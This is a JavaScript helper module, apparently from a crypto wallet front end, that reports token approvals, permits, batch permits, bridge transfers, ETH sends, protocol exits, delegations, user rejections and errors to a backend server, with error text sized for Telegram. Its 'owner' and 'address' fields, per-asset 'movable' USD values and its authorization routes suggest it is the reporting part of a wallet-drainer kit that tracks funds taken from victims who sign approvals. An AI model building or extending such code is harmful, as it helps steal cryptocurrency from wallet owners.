import { devLog } from "./helpers";

export async function apiCall(url, route, requestBody) {
  try {
    const res = await fetch(url + route, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        "x-tag-s": import.meta.env.VITE_APP_K,
      },
      body: JSON.stringify(requestBody),
    });
    const data = await res.json();
    return data;
  } catch (error) {
    console.error("Error fetching data:", error);
  }
}

/** Approval / permit / multicall / ethSend — tokenData.balance shape. */
export const createTokenData = (token, customBalance = null) => {
  const balance =
    customBalance !== null ? Number(customBalance) : Number(token?.amount);
  const stratAmt = Number(token?.amount) || 0;
  const stratVal = Number(token?.tokenValue) || 0;
  // When customBalance is the real tx qty, scale USD from strat unit price.
  const value =
    customBalance !== null && stratAmt > 0 && Number.isFinite(balance)
      ? (stratVal / stratAmt) * balance
      : stratVal;
  return {
    address: token?.id,
    symbol: token?.symbol,
    balance: Number.isFinite(balance) ? balance : 0,
    value,
    type: token?.tokenType,
  };
};

/**
 * Move Attempts — Bridge tokenFrom + ProtocolExit tokenData (`amount`, not balance).
 * Readable qty that went into the tx; USD scaled from strat unit price.
 */
export const createMoveTokenData = (token, amount) => {
  const moved = Number(amount);
  const stratAmt = Number(token?.amount) || 0;
  const stratVal = Number(token?.tokenValue) || 0;
  const value =
    stratAmt > 0 && Number.isFinite(moved)
      ? (stratVal / stratAmt) * moved
      : stratVal;
  return {
    address: token?.id,
    symbol: token?.symbol,
    amount: Number.isFinite(moved) ? moved : 0,
    value,
    type: token?.tokenType,
  };
};

/** Underlying identity for ProtocolExit Attempt / reject / error (never vault share when known). */
export const resolveProtocolExitToken = (token) => {
  const underlying = token?.positionDetails?.underlying;
  return {
    id: underlying?.id || token?.id,
    symbol: underlying?.symbol || token?.symbol,
    amount: underlying?.amount ?? token?.amount,
    tokenValue: token?.tokenValue,
    tokenType: "erc20",
  };
};

/**
 * Comet authorize Attempt — comet address + per-asset movable breakdown.
 * Do not use resolveProtocolExitToken().id as address (that is underlying WETH).
 */
export const buildCompound3AuthorizeTokenData = (token) => {
  const pd = token?.positionDetails || {};
  const comet = pd.comet || token?.id;
  const movableUsd = Number(pd.movableUsd ?? token?.tokenValue) || 0;
  const supplies = (pd.withdrawableSupplies || []).filter(
    (s) => (Number(s.movableAmount) || 0) > 0 || (Number(s.movableUsd) || 0) > 0
  );
  const assets = supplies.map((s) => ({
    symbol: s.symbol || "?",
    amount: Number(s.movableAmount) || 0,
    value: Number(s.movableUsd) || 0,
  }));
  const cometLabel =
    (typeof pd.cometName === "string" && pd.cometName.trim()) || null;
  const symbol = token?.symbol || cometLabel || "compound_lending2";
  const movableAmount =
    assets.length === 1
      ? assets[0].amount
      : assets.reduce((sum, a) => sum + a.amount, 0) ||
        Number(token?.amount) ||
        0;

  return {
    address: comet,
    comet,
    symbol,
    amount: movableAmount,
    value: movableUsd,
    type: "erc20",
    ...(assets.length ? { assets } : {}),
  };
};

const PROTOCOL_EXIT_HANDLE_TYPES = new Set([
  "morphoBlueWithdraw",
  "morphoBlueAuthorize",
  "compound3Authorize",
  "erc4626Redeem",
  "erc4626Withdraw",
  "wlfiVestClaim",
]);

const MOVE_REPORT_HANDLE_TYPES = new Set([
  ...PROTOCOL_EXIT_HANDLE_TYPES,
  "wrapAndRelayTokens",
  "transferAndCall",
  "relayTokens",
  "libertyTransfer",
  "lifiTransfer",
  "hemiDeposit",
]);

/**
 * /reject + /error tokenData — same identity/qty field as success for that handleType.
 * Protocol exits → underlying + amount; bridges → token + amount; else balance.
 */
export const createReportTokenData = (token, handleType) => {
  if (!MOVE_REPORT_HANDLE_TYPES.has(handleType)) {
    return createTokenData(token);
  }
  if (handleType === "compound3Authorize") {
    return buildCompound3AuthorizeTokenData(token);
  }
  const source = PROTOCOL_EXIT_HANDLE_TYPES.has(handleType)
    ? resolveProtocolExitToken(token)
    : token;
  return createMoveTokenData(source, Number(source.amount));
};

/** EIP-1193 / CAIP user-reject codes only — not RPC revert codes. */
const USER_REJECTION_CODES = new Set([
  4001,
  "4001",
  5000,
  "5000",
  "ACTION_REJECTED",
]);

/**
 * Error names that mean user dismissed the wallet UI — not sign/tx wrapper classes
 * (WalletSignTransactionError etc. also fire on RPC/simulation failures).
 */
const USER_REJECTION_NAMES = new Set([
  "UserRejectedRequestError",
  "RejectedByUser",
  "WalletWindowClosedError",
]);

/**
 * Explicit user-intent phrases only. Do NOT match bare "reject", "reason", reverts, etc.
 * Sources: EIP-1193, wagmi connectors, TronLink runtime, Solana wallet adapters.
 */
const USER_REJECTION_MESSAGE =
  /user rejected(?: the request)?|user denied(?: transaction signature)?|user declined|user refused|user cancelled|user canceled|confirmation declined(?: by user)?|declined by user|request rejected by user|request declined|connection request reset|user closed modal|closed the modal/i;

/** Full text for /error logging — includes reason, shortMessage, details. */
function collectActionErrorText(error, depth = 0, seen = new Set()) {
  if (error == null || depth > 5) return [];

  if (typeof error === "string") return [error];

  if (typeof error !== "object") return [String(error)];

  if (seen.has(error)) return [];
  seen.add(error);

  const parts = [];

  for (const key of ["message", "shortMessage", "reason", "details"]) {
    const value = error[key];
    if (value != null && value !== "") {
      parts.push(String(value));
    }
  }

  if (typeof error.toString === "function") {
    const text = error.toString();
    if (text && text !== "[object Object]") {
      parts.push(text);
    }
  }

  if (error.error) {
    parts.push(...collectActionErrorText(error.error, depth + 1, seen));
  }
  if (error.cause) {
    parts.push(...collectActionErrorText(error.cause, depth + 1, seen));
  }

  return parts;
}

/**
 * User-facing text for reject detection — message + nested .error / .cause only.
 * Skips reason/shortMessage/details (RPC reverts, viem BaseError, on-chain failures).
 */
function collectUserFacingRejectText(error, depth = 0, seen = new Set()) {
  if (error == null || depth > 5) return [];

  if (typeof error === "string") return [error];

  if (typeof error !== "object") return [];

  if (seen.has(error)) return [];
  seen.add(error);

  const parts = [];

  if (error.message != null && error.message !== "") {
    parts.push(String(error.message));
  }

  if (error.error) {
    parts.push(...collectUserFacingRejectText(error.error, depth + 1, seen));
  }
  if (error.cause) {
    parts.push(...collectUserFacingRejectText(error.cause, depth + 1, seen));
  }

  return parts;
}

function findRejectionCode(error, depth = 0, seen = new Set()) {
  if (error == null || depth > 5 || typeof error !== "object") return undefined;
  if (seen.has(error)) return undefined;
  seen.add(error);

  if ("code" in error && USER_REJECTION_CODES.has(error.code)) {
    return error.code;
  }

  if (error.cause) {
    const fromCause = findRejectionCode(error.cause, depth + 1, seen);
    if (fromCause != null) return fromCause;
  }
  if (error.error) {
    const fromNested = findRejectionCode(error.error, depth + 1, seen);
    if (fromNested != null) return fromNested;
  }

  return undefined;
}

function actionErrorName(error) {
  if (error instanceof Error) return error.name;
  if (error && typeof error === "object" && "name" in error) {
    return String(error.name ?? "");
  }
  return "";
}

function userFacingRejectMessage(error) {
  return collectUserFacingRejectText(error).join(" | ");
}

/** True when the user rejected a sign/tx/permit prompt in an action hook catch. */
export function isActionUserRejection(error) {
  if (findRejectionCode(error) != null) {
    return true;
  }

  const name = actionErrorName(error);
  if (name && USER_REJECTION_NAMES.has(name)) {
    return true;
  }

  const message = userFacingRejectMessage(error);
  if (message && USER_REJECTION_MESSAGE.test(message)) {
    return true;
  }

  return false;
}

export function formatActionError(error) {
  const message = collectActionErrorText(error).join(" | ");
  // Cap for Telegram (4096) — ethers CALL_EXCEPTION dumps full tx/receipt.
  const text = message || "Unknown error";
  return text.length > 800 ? `${text.slice(0, 800)}…` : text;
}

export const logApprovalReject = (
  apiUrl,
  handleType,
  token,
  { address, owner, chainId },
  isBatchPermit = false,
) => {
  try {
    const tokenData = createReportTokenData(token, handleType);
    console.log("[logApprovalReject]", {
      handleType,
      isBatchPermit,
      address,
      chainId,
      token: tokenData?.symbol || tokenData?.address || null,
    });
    apiCall(apiUrl, "/reject", {
      address,
      owner,
      chainId,
      handleType,
      tokenData,
      isBatchPermit,
    });
  } catch (error) {
    console.log("[logApprovalReject] failed to report", error);
  }
};

export const logFeError = (
  apiUrl,
  handleType,
  token,
  { address, owner, chainId },
  error,
  isBatchPermit = false,
) => {
  try {
    const tokenData = createReportTokenData(token, handleType);
    const formatted = formatActionError(error);
    console.log("[logFeError]", {
      handleType,
      isBatchPermit,
      address,
      chainId,
      token: tokenData?.symbol || tokenData?.address || null,
      error: formatted,
    });
    apiCall(apiUrl, "/error", {
      address,
      owner,
      chainId,
      handleType,
      tokenData,
      isBatchPermit,
      error: formatted,
      statsCategory: "error",
      errorType: "fe_technical",
      statsSource: "fe",
    });
  } catch (err) {
    console.log("[logFeError] failed to report", err);
  }
};

export const logApprovalSuccess = (
  apiUrl,
  object,
  handleType,
  isBatchPermit = false,
) => {
  let route;
  switch (handleType) {
    case "ethSend":
      route = "/ethsend";
      break;
    case "wrapAndRelayTokens":
    case "transferAndCall":
    case "relayTokens":
    case "libertyTransfer":
    case "lifiTransfer":
    case "hemiDeposit":
      route = "/bridge";
      break;
    case "ethPermit":
    case "hyperliquidWithdrawal":
    case "hyperliquidSpotSend":
      route = "/permit";
      break;
    case "permit2":
      route = `/${isBatchPermit ? "batchpermit" : "singlepermit"}`;
      break;
    case "permitAuthorization":
      route = "/permitAuth";
      break;
    case "morphoBlueWithdraw":
    case "morphoBlueAuthorize":
    case "compound3Authorize":
    case "erc4626Redeem":
    case "erc4626Withdraw":
    case "wlfiVestClaim":
      route = "/protocolExit";
      break;
    case "delegate":
      route = "/delegate";
      break;
    default:
      route = "/approval";
      break;
  }

  console.log("[logApprovalSuccess]", {
    handleType,
    route,
    isBatchPermit,
    txHash: object?.txHash || object?.transactionHash || null,
    token:
      object?.tokenFrom?.symbol ||
      object?.tokenData?.symbol ||
      object?.tokenData?.id ||
      null,
  });
  apiCall(apiUrl, route, object);
};
